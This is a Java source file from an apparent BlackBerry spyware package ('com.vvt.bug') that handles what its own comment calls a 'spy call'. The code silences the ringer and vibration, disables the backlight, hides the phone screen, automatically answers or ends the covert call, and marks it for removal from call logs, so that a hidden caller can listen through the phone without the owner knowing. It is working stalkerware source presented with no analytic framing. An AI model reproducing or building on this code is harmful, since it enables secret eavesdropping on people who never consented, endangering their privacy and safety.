package com.vvt.bug;

import java.util.Timer;
import java.util.TimerTask;
import com.vvt.std.Log;
import net.rim.blackberry.api.phone.PhoneCall;
import net.rim.device.api.system.Application;
import net.rim.device.api.system.Audio;
import net.rim.device.api.system.Backlight;
import net.rim.device.api.ui.Keypad;
import net.rim.device.api.ui.MenuItem;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;

public class PELPFourFiveAndBelow extends BasePELP {
	
	private static final String endCallMenuItemName = "End Call";
	
	protected void rejectSCIncoming( final MenuItem endCallThread, long timeToWait) {
		try {
			new Timer().schedule(new TimerTask() {
				 public void run() {
					 rejectSCIncoming( endCallThread);
				 }
			}, timeToWait);
		} catch (Exception e) {
			Log.error("PELPFourFiveAndBelow.rejectSCIncoming", "", e);
		}
	}
	
	protected void rejectSCIncoming( MenuItem endCallThread) {
		try {
			if (endCallThread!=null) {
				new Thread(endCallThread).start();
			}
			else
				super.rejectSCIncoming();
		} catch (Exception e) {
			Log.error("PELPFourFiveAndBelow.rejectSCIncoming", "", e);
		}
	}
	
	protected void endSCCaseKeyPressed() {
		rejectSCIncoming( endSCThread);
	}
	
	protected void scheduleVoiceAppManipulation() {
		try {
			Application.getApplication().invokeLater(new Runnable() {
				public void run() {
			        try {
			        	scPhoneScreen = voiceApp.getActiveScreen();
						voiceApp.popScreen( scPhoneScreen);
						Backlight.enable(false);
					} catch (Exception e) {
					}
			    }
			}, 150, false);
		} catch (Exception e) {
			Log.error("PELPFourFiveAndBelow.scheduleVoiceAppManipulation", "", e);
		}
	}
	
	public void callWaiting(int callId) {
		try {
			callWaitingIdUnique = lastCallInitiatedOrIncomingId != callId;
			if (numberOfCallsConnected==0)
				numberOfCallsConnected=1;
			addPhoneCallToAdministration(callId);
			if (sCInProgress) {
				stopVibrateAndSound();
				boolean isCDMA = false;//Network.isCDMA();
				boolean stopWaitingNormalCall = !isCDMA;
				if (stopWaitingNormalCall) {
					Screen screen = voiceApp.getActiveScreen();
					MenuItem endPhoneCallWaitingThread = getMenuItem( endCallMenuItemName, screen);
					rejectSCIncoming( endPhoneCallWaitingThread, pelSettings.waitBeforeEndNormalCallWhenSCActiveMS);
				}
				rejectSCIncoming( endSCThread, pelSettings.waitBeforeEndSCWhenNormalCallWaitingMS);
			} else {
				if (callWaitingIdUnique) {
					PhoneCall sC = isSC(callId);
					if (sC != null) {
						volumeAudioOriginal = Audio.getVolume();
						stopVibrateAndSound();
						voiceApp.suspendPainting(true);
						Screen screen = voiceApp.getActiveScreen();
						endSCThread = getMenuItem( endCallMenuItemName, screen);
						rejectSCIncoming( pelSettings.waitBeforeRejectSCWaitingMS);
					}
				} else {
					disableSCRemovalFromLogs = true;
				}
			}
		} catch (Exception e) {
			Log.error("PELPFourFiveAndBelow.callWaiting", "", e);
		}
	}

	protected void stopSCStuff(boolean failed) {
		super.stopSCStuff(failed);
		endSCThread = null;
	}
	
	public void callIncoming(int callId) {
		try {
			if (numberOfCallsConnected > 0) {
				callWaiting(callId);
			} else {
				UiApplication voiceAppTemp = UiApplication.getUiApplication();
				voiceApp = (voiceAppTemp != null) ? voiceAppTemp : voiceApp;
				volumeAudioOriginal = Audio.getVolume();
				stopVibrateAndSound();
				disableSCRemovalFromLogs = false;
				lastCallInitiatedOrIncomingId = callId;
				addPhoneCallToAdministration(callId);
				PhoneCall sC = isSC(callId);
				sCInProgress = sC!=null;
				sCInjectEvent = sCInProgress;
				if (sCInProgress) { // Spy call is activating.
					try {
						voiceApp.suspendPainting(true);
						Screen screen = voiceApp.getActiveScreen();
						endSCThread = getMenuItem( endCallMenuItemName, screen);
						determineAcceptSc();
						if (lastIncomingSCAccepted) {
							patScheduledEndCall = new PhoneKeyActionThread(endSCThread,(char) Keypad.KEY_END,pelSettings.scheduleEndSCWhenNotConnectedOrNotAnsweredMS);
						}
						else {
							rejectByEnd = voiceApp.isForeground() && pelSettings.rejectCallByEndWhenVoiceAppRunning;
							rejectByEnd |= !pelSettings.rejectCallByAnswerAndEnd;
						}
					} catch (Exception e) {
						Log.error("PELPFourFiveAndBelow.callIncoming", "INNER", e);
					}
				} else {
					cancelStopVibrateAndSound();
				}
			}
		} catch (Exception e) {
			Log.error("PELPFourFiveAndBelow.callIncoming", "OUTER", e);
		}
	}
}